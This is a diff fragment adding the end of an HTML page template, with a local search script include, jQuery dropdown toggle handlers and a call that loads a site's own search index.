+<script src="/js/search.min.js"></script>
+<script type="text/javascript">
+
+// disqus scripts
+
+
+// dropdown scripts
+$(".dropdown").click(function(event) {
+  var current = $(this);
+  event.stopPropagation();
+  $(current).children(".dropdown-content")[($(current).children(".dropdown-content").hasClass("open"))?'removeClass':'addClass']("open")
+});
+$(document).click(function(){
+    $(".dropdown-content").removeClass("open");
+})
+
+var path = "/search.xml";
+searchFunc(path, 'local-search-input', 'local-search-result');
+
+</script>
+
+</body>
+</html>
